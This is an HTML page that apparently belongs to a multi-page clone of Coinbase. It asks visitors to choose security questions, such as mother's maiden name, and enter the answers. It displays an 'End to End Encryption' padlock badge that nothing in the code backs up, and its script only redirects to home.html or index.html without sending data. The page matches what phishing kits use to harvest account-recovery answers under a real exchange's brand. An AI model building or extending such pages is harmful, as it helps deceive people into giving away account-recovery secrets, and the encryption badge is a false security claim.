<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Account Security - Coinbase</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #000;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
      box-sizing: border-box;
    }

    .top-right {
      position: absolute;
      top: 20px;
      right: 20px;
    }

    .top-right a {
      color: #4c8ffb;
      font-weight: 500;
      text-decoration: none;
      font-size: 15px;
    }

    .security-container {
      width: 100%;
      max-width: 400px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .security-title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 15px;
    }

    .security-text {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
      width: 100%;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 8px;
      color: #fff;
    }

    .form-group select,
    .form-group input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background-color: #2c2c2c;
      color: white;
      font-size: 14px;
      box-sizing: border-box;
    }

    .form-group input::placeholder {
      color: #888;
    }

    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 32px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-primary {
      background-color: #4c8ffb;
      color: black;
    }

    .btn-primary:hover {
      background-color: #367af6;
    }

    .btn.loading .btn-text {
      visibility: hidden;
    }

    .btn.loading::after {
      content: '';
      position: absolute;
      width: 20px;
      height: 20px;
      border: 3px solid black;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    .footer-link {
      margin-top: 20px;
      font-size: 14px;
    }

    .footer-link a {
      color: #4c8ffb;
      text-decoration: none;
      cursor: pointer;
    }

    .footer-link a:hover {
      text-decoration: underline;
    }

    /* End to End Encryption Text with CSS Padlock */
    .encryption-text {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 14px;
      color: #4c8ffb;
      margin-top: 20px;
      margin-bottom: 20px;
      text-align: center;
      font-weight: 500;
    }

    .padlock {
      width: 16px;
      height: 20px;
      position: relative;
      display: inline-block;
    }

    .padlock::before {
      content: '';
      position: absolute;
      top: 0;
      left: 4px;
      width: 8px;
      height: 8px;
      border: 2px solid #4c8ffb;
      border-bottom: none;
      border-radius: 8px 8px 0 0;
      animation: lock-shackle 0.5s ease-in-out;
    }

    .padlock::after {
      content: '';
      position: absolute;
      top: 8px;
      left: 0;
      width: 16px;
      height: 12px;
      background: #4c8ffb;
      border-radius: 2px;
      box-shadow: 0 0 8px rgba(76, 143, 251, 0.5);
    }

    @keyframes lock-shackle {
      0% { transform: translateY(2px); }
      50% { transform: translateY(-2px); }
      100% { transform: translateY(0); }
    }

    /* Loading Overlay for Skip Link */
    .loading-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #000;
      z-index: 2000;
      align-items: center;
      justify-content: center;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #4c8ffb;
      border-top: 5px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="security-container">
    <div class="security-title">Set Up Security Questions</div>
    <div class="security-text">
      Choose security questions and provide answers to protect your account. These will help verify your identity if you need to recover your account.
    </div>

    <form id="security-form">
      <div class="form-group">
        <label for="question1">Security Question 1</label>
        <select id="question1" name="question1" required>
          <option value="" disabled selected>Select a question</option>
          <option value="q1">What was the name of your first pet?</option>
          <option value="q2">What is your mother's maiden name?</option>
          <option value="q3">What was the name of your elementary school?</option>
          <option value="q4">What is your favorite book?</option>
        </select>
      </div>
      <div class="form-group">
        <label for="answer1">Answer</label>
        <input type="text" id="answer1" name="answer1" placeholder="Enter your answer" required>
      </div>

      <div class="form-group">
        <label for="question2">Security Question 2</label>
        <select id="question2" name="question2" required>
          <option value="" disabled selected>Select a question</option>
          <option value="q1">What was the name of your first pet?</option>
          <option value="q2">What is your mother's maiden name?</option>
          <option value="q3">What was the name of your elementary school?</option>
          <option value="q4">What is your favorite book?</option>
        </select>
      </div>
      <div class="form-group">
        <label for="answer2">Answer</label>
        <input type="text" id="answer2" name="answer2" placeholder="Enter your answer" required>
      </div>

      <button type="submit" class="btn btn-primary" id="save-btn">
        <span class="btn-text">Save Security Questions</span>
      </button>
    </form>

    <div class="encryption-text">
      <span class="padlock"></span>
      End to End Encryption
    </div>

    <div class="footer-link">
      <a id="skip-link" href="home.html">Skip for now</a>
    </div>
  </div>

  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loading-overlay">
    <div class="spinner"></div>
  </div>

  <script>
    // Handle form submission
    document.getElementById('security-form').addEventListener('submit', function(event) {
      event.preventDefault();
      const saveBtn = document.getElementById('save-btn');

      // Show loading effect
      saveBtn.classList.add('loading');
      saveBtn.disabled = true;

      // Redirect after delay
      setTimeout(() => {
        window.location.href = 'home.html';
      }, 1000); // 1-second delay
    });

    // Handle skip link click
    document.getElementById('skip-link').addEventListener('click', function(event) {
      event.preventDefault();
      const loadingOverlay = document.getElementById('loading-overlay');

      // Show loading overlay
      loadingOverlay.style.display = 'flex';

      // Redirect after delay
      setTimeout(() => {
        window.location.href = 'index.html';
      }, 1000); // 1-second delay
    });
  </script>
</body>
